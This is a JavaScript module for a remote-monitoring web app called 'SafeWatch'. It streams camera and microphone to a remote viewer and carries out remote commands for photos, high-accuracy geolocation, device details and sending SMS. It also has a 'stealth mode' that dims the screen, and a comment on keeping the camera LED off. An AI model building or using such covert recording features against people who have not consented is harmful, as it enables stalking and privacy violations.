/**
 * SafeWatch v4.0 - Monitor Module
 * Handles camera, streaming, and stealth mode
 */

import { Core } from './core.js';

export class MonitorSystem {
    constructor(roomId) {
        this.roomId = roomId;
        this.socket = io();
        this.localStream = null;
        this.peerConnection = null;
        this.currentFacingMode = 'environment'; // Default to back camera
        this.iceCandidatesQueue = [];

        this.init();
    }

    async init() {
        console.log("Initializing Monitor System...");
        this.setupSocket();
        await this.startCamera();
        this.startBatteryUpdates();
    }

    setupSocket() {
        this.socket.emit('join-room', this.roomId, 'monitor');

        // Start heartbeat
        this.startHeartbeat();

        this.socket.on('request-monitor-status', () => {
            this.socket.emit('monitor-announcement', { roomId: this.roomId });
            this.sendDeviceInfo();
            this.forceBatteryUpdate();
        });

        this.socket.on('offer', async (payload) => {
            console.log("RTC: Received Offer");
            await this.handleOffer(payload);
        });

        this.socket.on('ice-candidate', async (payload) => {
            if (this.peerConnection && this.peerConnection.remoteDescription) {
                await this.peerConnection.addIceCandidate(new RTCIceCandidate(payload.candidate));
            } else {
                this.iceCandidatesQueue.push(payload.candidate);
            }
        });

        // Enhanced command handler with ACK
        this.socket.on('command', async (payload) => {
            const { command, commandId } = payload;
            console.log(`📥 Command Received [${commandId}]:`, command);

            try {
                // Process command
                if (command === 'take-photo') {
                    await this.takeRemotePhoto();
                } else if (command === 'get-status') {
                    this.reportStatus();
                } else if (command === 'send-sms') {
                    this.sendSms(payload.phone, payload.message);
                } else {
                    await this.handleCommand(payload);
                }

                // Send ACK
                this.socket.emit('command-ack', {
                    roomId: this.roomId,
                    commandId,
                    command,
                    status: 'success',
                    timestamp: Date.now()
                });

                console.log(`✅ Command ACK sent [${commandId}]`);

            } catch (error) {
                console.error(`❌ Command failed [${commandId}]:`, error);

                // Send error ACK
                this.socket.emit('command-ack', {
                    roomId: this.roomId,
                    commandId,
                    command,
                    status: 'error',
                    error: error.message,
                    timestamp: Date.now()
                });
            }
        });

        // Legacy control-command support
        this.socket.on('control-command', async (payload) => {
            console.log("Control Command Received:", payload.command);
            this.handleCommand(payload);
        });

        // Connection status
        this.socket.on('room-status', (data) => {
            console.log(`Room status: ${data.clientCount} clients in ${data.roomId}`);
        });

        this.socket.on('disconnect', () => {
            console.log('⚠️ Disconnected from server');
            if (this.heartbeatInterval) {
                clearInterval(this.heartbeatInterval);
            }
        });

        this.socket.on('connect', () => {
            console.log('✅ Reconnected to server');
            this.socket.emit('join-room', this.roomId, 'monitor');
            this.startHeartbeat();
        });
    }

    startHeartbeat() {
        // Clear existing interval
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
        }

        // Send heartbeat every 5 seconds
        this.heartbeatInterval = setInterval(() => {
            this.socket.emit('heartbeat', {
                roomId: this.roomId,
                timestamp: Date.now()
            });
        }, 5000);
    }

    async takeRemotePhoto() {
        if (!this.localStream) return;
        const track = this.localStream.getVideoTracks()[0];
        if (!track) return;

        const capture = new ImageCapture(track);
        try {
            const blob = await capture.takePhoto();
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                this.socket.emit('status-update', {
                    roomId: this.roomId,
                    type: 'photo-captured',
                    data: reader.result,
                    timestamp: Date.now()
                });
            };
        } catch (e) {
            console.error("Capture failed", e);
        }
    }

    reportStatus() {
        if ('getBattery' in navigator) {
            navigator.getBattery().then(b => {
                this.socket.emit('status-update', {
                    roomId: this.roomId,
                    battery: Math.round(b.level * 100),
                    charging: b.charging,
                    connection: navigator.onLine ? 'online' : 'offline',
                    timestamp: Date.now()
                });
            });
        }
    }

    sendSms(phone, message) {
        console.log(`📱 Sending SMS to ${phone}`);

        // Better URI formatting based on OS
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        // iOS 8+ uses '&', Android uses '?'
        const bodySep = isIOS ? '&' : '?';
        const smsUri = `sms:${phone}${bodySep}body=${encodeURIComponent(message)}`;

        let success = false;

        // Method 1: Anchor Tag Click (Most reliable on modern mobile browsers)
        try {
            const link = document.createElement('a');
            link.href = smsUri;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            setTimeout(() => {
                if (document.body.contains(link)) document.body.removeChild(link);
            }, 500);
            console.log('✅ SMS triggered via Anchor Click');
            success = true;
        } catch (e) {
            console.warn('⚠️ Anchor click failed, trying iframe...', e);
        }

        // Method 2: Hidden Iframe (Fallback if anchor fails or is blocked)
        if (!success) {
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = smsUri;
                document.body.appendChild(iframe);
                setTimeout(() => {
                    if (document.body.contains(iframe)) document.body.removeChild(iframe);
                }, 2000);
                console.log('✅ SMS triggered via iframe');
                success = true;
            } catch (e) {
                console.error('❌ Iframe method failed', e);
            }
        }

        // Notify success to viewer
        this.socket.emit('status-update', {
            roomId: this.roomId,
            type: 'sms-sent',
            phone: phone,
            message: message.substring(0, 50) + (message.length > 50 ? '...' : ''),
            timestamp: Date.now()
        });
    }

    async startCamera(facingMode = this.currentFacingMode) {
        console.log(`Camera: Starting ${facingMode}...`);

        // Stop previous tracks
        if (this.localStream) {
            this.localStream.getTracks().forEach(t => t.stop());
        }

        try {
            const isAudioOnly = Core.getMode() === 'audio';

            // Critical: strictly false for video to avoid camera LED activation
            const constraints = {
                video: isAudioOnly ? false : {
                    facingMode: facingMode,
                    width: { ideal: 1280, max: 1920 },
                    height: { ideal: 720, max: 1080 },
                    zoom: true, pan: true, tilt: true
                },
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    autoGainControl: true
                }
            };

            console.log("Requesting access. Audio mode:", isAudioOnly);
            this.localStream = await navigator.mediaDevices.getUserMedia(constraints);
            console.log("Stream acquired.");

            if (!isAudioOnly) {
                const localVideo = document.getElementById('localVideo');
                if (localVideo) {
                    localVideo.srcObject = this.localStream;
                    localVideo.play().catch(e => console.warn("Autoplay block:", e));
                }
            } else {
                // Auto-stealth for audio mode
                setTimeout(() => {
                    if (window.toggleStealthMode) window.toggleStealthMode();
                }, 1000);
            }

            // If RTC is active, replace track
            if (this.peerConnection) {
                const videoTrack = this.localStream.getVideoTracks()[0];
                const sender = this.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
                if (sender) sender.replaceTrack(videoTrack);
            }

        } catch (err) {
            console.error("Camera Error:", err);
            // Fallback to basic constraints if PTZ or HD fails
            if (err.name === 'OverconstrainedError' || err.name === 'NotReadableError') {
                console.log("Retrying with basic constraints...");
                this.localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
            }
        }
    }

    async handleOffer(payload) {
        this.peerConnection = new RTCPeerConnection(Core.rtcConfig);

        this.peerConnection.onicecandidate = (e) => {
            if (e.candidate) this.socket.emit('ice-candidate', { roomId: this.roomId, candidate: e.candidate });
        };

        this.localStream.getTracks().forEach(track => {
            this.peerConnection.addTrack(track, this.localStream);
        });

        await this.peerConnection.setRemoteDescription(new RTCSessionDescription(payload.sdp));
        const answer = await this.peerConnection.createAnswer();
        await this.peerConnection.setLocalDescription(answer);

        this.socket.emit('answer', { roomId: this.roomId, sdp: answer });

        // Process queued ICE
        while (this.iceCandidatesQueue.length > 0) {
            const cand = this.iceCandidatesQueue.shift();
            await this.peerConnection.addIceCandidate(new RTCIceCandidate(cand));
        }
    }

    async handleCommand(payload) {
        const { command, value } = payload;
        const videoTrack = this.localStream ? this.localStream.getVideoTracks()[0] : null;

        console.log("Control:", command, value);

        switch (command) {
            case 'switch-camera':
                this.currentFacingMode = this.currentFacingMode === 'user' ? 'environment' : 'user';
                await this.startCamera(this.currentFacingMode);
                break;

            case 'toggle-torch':
                if (videoTrack) {
                    const caps = videoTrack.getCapabilities();
                    if (caps.torch) {
                        const settings = videoTrack.getSettings();
                        videoTrack.applyConstraints({ advanced: [{ torch: !settings.torch }] });
                    }
                }
                break;

            case 'set-zoom':
                if (videoTrack) {
                    try {
                        const caps = videoTrack.getCapabilities();
                        if (caps.zoom) {
                            const zoomVal = Math.min(Math.max(value, caps.zoom.min), caps.zoom.max);
                            await videoTrack.applyConstraints({ advanced: [{ zoom: zoomVal }] });
                        }
                    } catch (e) { console.error("Zoom apply fail", e); }
                }
                break;

            case 'capture-photo':
                this.takeSnapshot(true);
                break;

            case 'refresh-info':
                this.sendDeviceInfo();
                this.forceBatteryUpdate();
                break;

            case 'restart-app':
                window.location.reload(true);
                break;

            case 'hard-lock':
                if (window.toggleStealthMode) {
                    // Force active if not already
                    const overlay = document.getElementById('dim-overlay');
                    if (overlay && !overlay.classList.contains('active')) {
                        window.toggleStealthMode();
                    }
                }
                break;

            case 'screen-dim':
                if (window.toggleStealthMode) window.toggleStealthMode();
                break;
        }
    }

    async takeSnapshot(isManual = false) {
        if (!this.localStream) return;
        const video = document.getElementById('localVideo');
        if (!video || video.readyState < 2) return;

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        try {
            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
            // Send multiple times to ensure delivery or use a more reliable method
            this.socket.emit('stream-data', {
                roomId: this.roomId,
                image: dataUrl,
                isSnapshot: isManual,
                timestamp: Date.now()
            });
            console.log("Snapshot sent success");
        } catch (e) {
            console.error("Canvas export failed", e);
        }
    }

    async sendDeviceInfo() {
        const getInfo = async () => {
            const base = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || 'N/A',
                screen: `${window.screen.width}x${window.screen.height}`,
                connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
                location: null // Will be updated async
            };

            // First emit basic info immediately
            this.socket.emit('device-info', { roomId: this.roomId, info: base });

            // Then try to get high accuracy location
            if ("geolocation" in navigator) {
                console.log('📍 Requesting geolocation...');
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        console.log('📍 Location acquired');
                        base.location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: pos.timestamp
                        };
                        this.socket.emit('device-info', {
                            roomId: this.roomId,
                            info: base,
                            updateType: 'location'
                        });
                    },
                    (err) => {
                        console.warn('📍 Location error:', err.message);
                        base.location = { error: err.message };
                        this.socket.emit('device-info', { roomId: this.roomId, info: base });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
            return base;
        };
        await getInfo();
    }

    startBatteryUpdates() {
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                const send = () => {
                    this.socket.emit('status-update', {
                        roomId: this.roomId,
                        type: 'battery',
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    });
                };
                send();
                battery.onlevelchange = send;
                battery.onchargingchange = send;
            });
        }
    }

    forceBatteryUpdate() {
        if ('getBattery' in navigator) {
            navigator.getBattery().then(b => {
                this.socket.emit('status-update', {
                    roomId: this.roomId,
                    type: 'battery',
                    level: Math.round(b.level * 100),
                    charging: b.charging
                });
            });
        }
    }
}
